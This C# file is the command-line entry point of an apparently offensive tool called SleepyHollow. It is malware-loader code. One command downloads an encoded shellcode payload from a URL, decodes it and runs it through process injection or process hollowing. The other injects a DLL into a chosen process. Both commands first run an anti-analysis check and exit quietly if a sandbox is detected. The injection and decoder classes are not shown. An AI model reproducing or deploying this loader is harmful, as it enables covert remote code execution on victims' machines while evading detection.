using SleepyHollow;
using System.CommandLine;


var payloadOption = new Option<string>(
    name: "--payload",
    description: "The file to download and execute");
payloadOption.AddAlias("-p");

var methodOption = new Option<string>(
    name: "--method",
    description: "Execution method").FromAmong("inject", "hollow");
methodOption.AddAlias("-m");

var scCommand = new Command("sc", "Injects and runs shellcode"){
    payloadOption,
    methodOption
};

var dllName = new Argument<string>("dllName", "The DLL to inject");
var processName = new Argument<string>("processName", "The process to inject into");
var dllCommand = new Command("dll", "Injects and runs DLL"){
    processName,
    dllName
};

var rootCommand = new RootCommand("SleepyHollow");
rootCommand.AddCommand(scCommand);
rootCommand.AddCommand(dllCommand);


scCommand.SetHandler(async (url, method) =>
{
    Console.WriteLine("Running checks...");
    if (EvasionCheck.Detected)
    {
        Console.WriteLine("Have a nice day!");
        Environment.Exit(0);
    }

    var httpClient = new HttpClient();
    var data = await httpClient.GetStringAsync(url);
    Console.WriteLine($"Downloaded {data.Length} bytes");
    var buf = Decoder.DecodeString(data);
    Console.WriteLine($"Decrypted payload to {buf.Length} bytes");
    var inject = method.Equals("inject", StringComparison.OrdinalIgnoreCase);
    if (inject)
        await InjectProcess.Run(buf);
    else
        await HollowProcess.Run(buf);
}, payloadOption, methodOption);

dllCommand.SetHandler(async (processName, dllName) =>
{
    Console.WriteLine("Running checks...");
    if (EvasionCheck.Detected)
    {
        Console.WriteLine("Have a nice day!");
        Environment.Exit(0);
    }

    await InjectDLL.Run(dllName, processName);
}, processName, dllName);

await rootCommand.InvokeAsync(args);